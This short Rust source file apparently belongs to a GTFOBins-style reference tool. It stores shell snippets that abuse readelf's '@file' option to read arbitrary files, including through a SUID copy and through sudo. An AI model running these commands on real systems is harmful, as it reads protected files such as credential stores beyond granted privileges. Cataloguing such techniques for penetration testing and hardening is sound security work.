pub static BIN_NAME: &'static str = "readelf";
pub static BIN_DESC: &'static str = "Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    readelf -a @$LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which readelf) .

    LFILE=file_to_read
    ./readelf -a @$LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo readelf -a @$LFILE
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
